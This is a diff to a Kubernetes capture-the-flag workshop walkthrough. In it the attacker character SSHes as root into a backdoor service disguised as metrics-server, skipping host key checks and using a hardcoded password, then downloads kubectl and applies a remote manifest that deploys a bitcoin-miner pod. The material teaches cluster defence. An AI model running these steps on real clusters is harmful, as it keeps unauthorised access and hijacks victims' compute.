@@ -22,16 +22,21 @@ __Red__ reconnects to the cluster using the SSH service disguised as a *metrics-
 
 ## Deploying Miners
 
-Connect to the cluster via SSH:
+You will need the SSH server IP address that was deployed in the previous attack.  You can fetch it again in the hacked app by running:
 ```console
+SSH_SERVER_IP=$(kubectl get svc metrics-server-service -n kube-system -o table -o jsonpath='{.status.loadBalancer.ingress[0].ip}')
+echo $SSH_SERVER_IP
 echo "SSH password is: Sup3r_S3cr3t_P@ssw0rd"
-ssh root@<service IP from attack 1> -p 8080
+ssh root@$SSH_SERVER_IP -p 8080 -o StrictHostKeyChecking=no
 ```
 
-Let's redownload kubectl and create our miner:
+Let's re-download kubectl and create our miner:
 ```console
-apk update; apk add curl
-cd /usr/local/bin; curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"; chmod 555 kubectl
+apk update
+apk add curl
+cd /usr/local/bin
+curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
+chmod 555 kubectl
 export KUBERNETES_SERVICE_HOST=kubernetes.default.svc
 export KUBERNETES_SERVICE_PORT=443
 kubectl apply -f https://raw.githubusercontent.com/azure/aks-ctf/refs/heads/main/workshop/scenario_1/bitcoinero.yaml
@@ -42,4 +47,14 @@ Verify that the pod is running:
 kubectl get pods -n dev
 ```
 
-Time for some celebratory pizza!
+The output should look something like this:
+```console
+NAME                           READY   STATUS    RESTARTS   AGE
+bitcoinero-6b95755447-cttkz    1/1     Running   0          23s
+insecure-app-66dffb686-tp46w   1/1     Running   0          24m
+```
+
+Time for some celebratory pizza! Go ahead and logout of the ssh session.
+```console
+exit
+```
